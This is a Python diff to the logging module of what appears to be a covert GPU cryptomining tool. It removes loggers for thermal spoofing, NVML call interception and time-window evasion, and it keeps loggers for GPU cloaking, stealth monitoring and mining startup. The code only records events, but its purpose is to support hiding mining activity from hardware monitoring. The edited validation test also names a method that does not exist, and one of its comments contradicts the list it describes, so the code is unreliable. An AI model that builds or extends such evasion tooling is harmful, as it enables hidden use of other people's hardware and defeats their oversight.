@@ -163,24 +163,6 @@ def get_resource_control_logger():
     """
     return setup_logging('resource_control', str(Path(LOGS_DIR) / 'resource_control.log'), 'DEBUG')
 
-def get_thermal_logger():
-    """
-    **Get thermal logger** (Lấy logger nhiệt độ) - Logger cho **thermal spoofing operations** (hoạt động giả mạo nhiệt độ).
-    
-    Returns:
-        Logger: Thermal logger instance
-    """
-    return setup_logging('thermal', str(Path(LOGS_DIR) / 'thermal_spoofer.log'), 'DEBUG')
-
-def get_timing_logger():
-    """
-    **Get timing logger** (Lấy logger thời gian) - Logger cho **time-based manager operations** (hoạt động quản lý theo thời gian).
-    
-    Returns:
-        Logger: Timing logger instance
-    """
-    return setup_logging('timing', str(Path(LOGS_DIR) / 'time_based_manager.log'), 'DEBUG')
-
 def get_environment_logger():
     """
     **Get environment logger** (Lấy logger môi trường) - Logger cho **environment setup operations** (hoạt động thiết lập môi trường).
@@ -189,16 +171,6 @@ def get_environment_logger():
         Logger: Environment logger instance
     """
     return setup_logging('environment', str(Path(LOGS_DIR) / 'setup_env.log'), 'DEBUG')
-
-def get_nvml_logger():
-    """
-    **Get NVML logger** (Lấy logger NVML) - Logger cho **NVML interceptor operations** (hoạt động chặn NVML).
-    
-    Returns:
-        Logger: NVML logger instance
-    """
-    return setup_logging('nvml', str(Path(LOGS_DIR) / 'nvml_interceptor.log'), 'DEBUG')
-
 
 def get_stealth_monitor_logger():
     """
@@ -403,19 +375,6 @@ def log_gpu_monitoring_operation(operation: str, details: str, level: str = "INF
 # ===== DOMAIN-SPECIFIC METHODS (Phase 2) =====
 # Thêm các domain-specific methods cho GPU context intelligence
 
-def log_thermal_spoofing(message: str, temperature: float = None, level: str = "INFO"):
-    """
-    **Log thermal spoofing operation** (Ghi log hoạt động giả mạo nhiệt độ).
-    
-    Args:
-        message (str): **Log message** (thông điệp log)
-        temperature (float): **Temperature value** (giá trị nhiệt độ) (optional)
-        level (str): **Log level** (mức log)
-    """
-    thermal_logger = get_thermal_logger()
-    temp_info = f" [Temp: {temperature}°C]" if temperature else ""
-    getattr(thermal_logger, level.lower())(f"🌡️ [Thermal Spoofing]{temp_info} {message}")
-
 def log_plugin_lifecycle(plugin_name: str, event: str, details: str = None, level: str = "INFO"):
     """
     **Log plugin lifecycle event** (Ghi log sự kiện vòng đời plugin).
@@ -443,42 +402,6 @@ def log_gpu_cloaking(strategy: str, status: str, metrics: dict = None, level: st
     cloaking_logger = get_gpu_cloaking_logger()
     metrics_info = f" | Metrics: {metrics}" if metrics else ""
     getattr(cloaking_logger, level.lower())(f"🕵️ [Cloaking: {strategy}] Status: {status}{metrics_info}")
-
-def log_nvml_interception(function_name: str, intercepted: bool, return_value: any = None, level: str = "DEBUG", **kwargs):
-    """
-    **Log NVML interception** (Ghi log chặn NVML).
-    
-    Args:
-        function_name (str): **NVML function name** (tên hàm NVML)
-        intercepted (bool): **Whether intercepted** (có bị chặn không)
-        return_value (any): **Return value** (giá trị trả về) (optional)
-        level (str): **Log level** (mức log)
-        **kwargs: Additional parameters (e.g., utilization)
-    """
-    nvml_logger = get_nvml_logger()
-    intercept_status = "INTERCEPTED" if intercepted else "PASSED"
-    return_info = f" -> {return_value}" if return_value is not None else ""
-    
-    # Extract additional info from kwargs
-    additional_info = ""
-    if 'utilization' in kwargs:
-        additional_info += f" [Util: {kwargs['utilization']}%]"
-    
-    getattr(nvml_logger, level.lower())(f"🔧 [NVML: {function_name}] {intercept_status}{return_info}{additional_info}")
-
-def log_time_based_evasion(window_type: str, action: str, duration: int = None, level: str = "INFO"):
-    """
-    **Log time-based evasion** (Ghi log tránh né theo thời gian).
-    
-    Args:
-        window_type (str): **Time window type** (loại cửa sổ thời gian) (business_hours, off_peak, etc.)
-        action (str): **Evasion action** (hành động tránh né)
-        duration (int): **Duration in seconds** (thời lượng tính bằng giây) (optional)
-        level (str): **Log level** (mức log)
-    """
-    timing_logger = get_timing_logger()
-    duration_info = f" [Duration: {duration}s]" if duration else ""
-    getattr(timing_logger, level.lower())(f"⏰ [Time Window: {window_type}]{duration_info} Action: {action}")
 
 ###############################################################################
 #                           MODULE INITIALIZATION                           #
@@ -531,10 +454,7 @@ def validate_phase_2_completion() -> bool:
             get_registry_logger(),
             get_resource_manager_logger(),
             get_resource_control_logger(),
-            get_thermal_logger(),
-            get_timing_logger(),
             get_environment_logger(),
-            get_nvml_logger(),
             get_stealth_monitor_logger(),
             get_dashboard_logger(),
         ]
@@ -542,8 +462,9 @@ def validate_phase_2_completion() -> bool:
         all_loggers = test_loggers + new_test_loggers
         
         # Test domain-specific methods exist
-        domain_methods = ['log_thermal_spoofing', 'log_plugin_lifecycle', 
-                         'log_gpu_cloaking', 'log_nvml_interception', 'log_time_based_evasion']
+        domain_methods = ['log_plugin_lifecycle', 
+                         'log_gpu_cloaking',
+                         'log_stealth_monitor_logger']
         
         for logger in all_loggers:
             # Test basic logging methods
@@ -552,7 +473,7 @@ def validate_phase_2_completion() -> bool:
             
             # Test domain-specific methods for compatible loggers
             if hasattr(logger, '_context') and 'Cloaking' in str(getattr(logger, '_context', '')):
-                for method in domain_methods[:3]:  # thermal, plugin, gpu_cloaking
+                for method in domain_methods:  # Only gpu_cloaking
                     assert hasattr(logger, method), f"Logger missing {method}: {logger}"
         
         return True
@@ -577,8 +498,7 @@ __all__ = [
     
     # New GPU component logger functions
     'get_stealth_inference_logger', 'get_coordination_logger', 'get_registry_logger',
-    'get_resource_manager_logger', 'get_resource_control_logger', 'get_thermal_logger',
-    'get_timing_logger', 'get_environment_logger', 'get_nvml_logger',
+    'get_resource_manager_logger', 'get_resource_control_logger', 'get_environment_logger',
     'get_stealth_monitor_logger', 'get_dashboard_logger',
     'get_start_mining_logger',
     
@@ -587,8 +507,7 @@ __all__ = [
     'log_mining_performance_operation', 'log_audit_integration_operation', 'log_gpu_monitoring_operation',
     
     # Clean module-level functions
-    'log_thermal_spoofing', 'log_plugin_lifecycle', 'log_gpu_cloaking', 
-    'log_nvml_interception', 'log_time_based_evasion',
+    'log_plugin_lifecycle', 'log_gpu_cloaking', 
     
     # Initialization function
     'initialize_plugin_logging',
